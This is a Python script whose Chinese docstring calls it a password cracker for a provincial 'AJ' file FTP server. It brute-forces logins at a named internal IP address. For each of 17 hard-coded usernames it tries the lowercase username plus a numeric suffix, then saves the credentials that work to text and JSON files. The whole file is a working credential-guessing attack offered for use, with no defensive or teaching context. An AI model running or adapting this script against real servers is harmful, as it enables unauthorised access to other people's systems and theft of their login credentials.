"""
省级AJ文件FTP访问密码破解
"""

import ftplib
from ftplib import FTP
import time
import json

ftp = FTP()
IP = '10.104.233.1'
port = 21
userNames = ['FXF', 'FEZ', 'FES', 'TXT', 'FYG', 'TTM', 'FSK', 'TSZ', 'FJU', 'FUS', 'FHO',
            'FXG', 'TSN', 'FWY', 'TQJ', 'FXP', 'FJM']
userPassS = {}
for userName in userNames:
    pw = '001'
    while True:
        try:
            ftp.connect(IP, port)
            passWord = userName.lower() + pw
            ftp.login(userName, passWord)
        except ftplib.all_errors:
            pw = str(int(pw) + 1).zfill(3)
            # noinspection PyUnboundLocalVariable
            print(passWord + ' ' + 'failed')
            if int(pw) > 20:
                break
            time.sleep(1)
            continue
        else:
            print(passWord)
            print('The link is ok!')
            userPassS[userName] = passWord
            break
# 存txt文件
with open('AJ FTP访问user、pass.txt', 'w') as tf:
    for k, v in userPassS.items():
        tf.write(k + ':' + v + '\n')

# 存JSON文件
with open('AJ_ftp访问用户名、密码.json', 'w', encoding= 'utf-8') as jf:
    # 最后的参数indent可以将存入的数据格式化，即以逗号换行，一组一行
    json.dump(userPassS, jf, ensure_ascii= False, indent=0)
